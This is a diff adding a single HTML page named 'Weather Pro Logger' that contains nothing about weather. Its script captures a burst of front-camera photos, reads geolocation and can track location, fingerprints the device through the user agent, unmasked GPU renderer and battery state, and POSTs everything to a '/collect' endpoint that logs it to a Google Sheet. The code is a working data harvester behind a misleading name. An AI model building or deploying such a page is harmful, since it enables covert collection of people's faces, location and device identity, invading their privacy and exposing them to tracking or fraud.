@@ -1,0 +1,106 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <title>Weather Pro Logger</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet" />
+  <style>
+    body { margin:0; font-family:Inter, sans-serif; background:#0b1523; color:#e6edf3; }
+    .container { padding:24px; max-width:900px; margin:auto; }
+    .card { background:#121e2e; border-radius:12px; padding:20px; margin:16px 0; }
+    .btn { background:#4fd1c5; color:#073b3a; border:0; padding:12px 16px; border-radius:8px; cursor:pointer; margin-right:8px; margin-bottom: 5px; }
+    video,img { width: 150px; border-radius:8px; margin-top:8px; margin-right: 5px; }
+    pre { background:#0b1523; padding:12px; border-radius:8px; overflow:auto; max-height: 200px; }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>Weather Pro Logger</h1>
+    <div class="card">
+      <button id="initCam" class="btn">Init front camera</button>
+      <button id="burst" class="btn">4-photo burst</button>
+      <video id="preview" autoplay playsinline muted></video>
+      <div id="thumbs"></div>
+    </div>
+    <div class="card">
+      <button id="gather" class="btn">Gather device + battery</button>
+      <button id="startTrack" class="btn">Start location tracking</button>
+      <button id="stopTrack" class="btn">Stop tracking</button>
+      <button id="send" class="btn">Send to Google Sheets</button>
+      <pre id="output"></pre>
+    </div>
+  </div>
+
+  <script>
+    const initBtn=document.getElementById('initCam'), burstBtn=document.getElementById('burst');
+    const video=document.getElementById('preview'), thumbs=document.getElementById('thumbs');
+    const output=document.getElementById('output');
+    let mediaStream, burstImages=[], payload={}, watchId=null, liveLocations=[];
+
+    // 1. Camera Logic
+    initBtn.addEventListener('click', async () => {
+      mediaStream = await navigator.mediaDevices.getUserMedia({ video:{ facingMode:'user' }, audio:false });
+      video.srcObject = mediaStream;
+    });
+
+    burstBtn.addEventListener('click', async () => {
+      if(!mediaStream) return alert('Init camera first');
+      burstImages=[]; thumbs.innerHTML='';
+      const canvas=document.createElement('canvas'); 
+      canvas.width=640; canvas.height=480;
+      const ctx=canvas.getContext('2d');
+      for(let i=0;i<4;i++){
+        ctx.drawImage(video,0,0,640,480);
+        const dataUrl=canvas.toDataURL('image/jpeg',0.5); // Lower quality to save space
+        burstImages.push(dataUrl);
+        const img=document.createElement('img'); img.src=dataUrl; thumbs.appendChild(img);
+        await new Promise(r=>setTimeout(r,400));
+      }
+    });
+
+    // 2. Device Data Logic
+    async function getGPU(){
+      const c=document.createElement('canvas'); const gl=c.getContext('webgl');
+      if(!gl) return {vendor:"N/A", renderer:"N/A"};
+      const dbg=gl.getExtension('WEBGL_debug_renderer_info');
+      return {
+        vendor: dbg?gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL):gl.getParameter(gl.VENDOR),
+        renderer: dbg?gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL):gl.getParameter(gl.RENDERER)
+      };
+    }
+
+    async function getBattery(){
+      try { const b=await navigator.getBattery(); return { level:Math.round(b.level*100), charging:b.charging }; }
+      catch { return {level:"N/A", charging:"N/A"}; }
+    }
+
+    // 3. Gathering Everything
+    document.getElementById('gather').addEventListener('click', async ()=>{
+      const gpu=await getGPU(), battery=await getBattery();
+      const loc = await new Promise(r => navigator.geolocation.getCurrentPosition(p => r({lat:p.coords.latitude, lon:p.coords.longitude}), e => r({lat:"Denied", lon:"Denied"})));
+      
+      payload = { 
+        ts: new Date().toISOString(), 
+        ua: navigator.userAgent, 
+        gpu, battery, loc, 
+        burstImages,
+        ips: { public: ["Fetching..."] } 
+      };
+      output.textContent = JSON.stringify(payload, null, 2);
+    });
+
+    // 4. Send to Render
+    document.getElementById('send').addEventListener('click', async () => {
+      output.textContent = "Sending...";
+      const response = await fetch('/collect', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify(payload)
+      });
+      if(response.ok) output.textContent = "✅ Success: Logged to Google Sheet!";
+      else output.textContent = "❌ Error sending data";
+    });
+  </script>
+</body>
+</html>
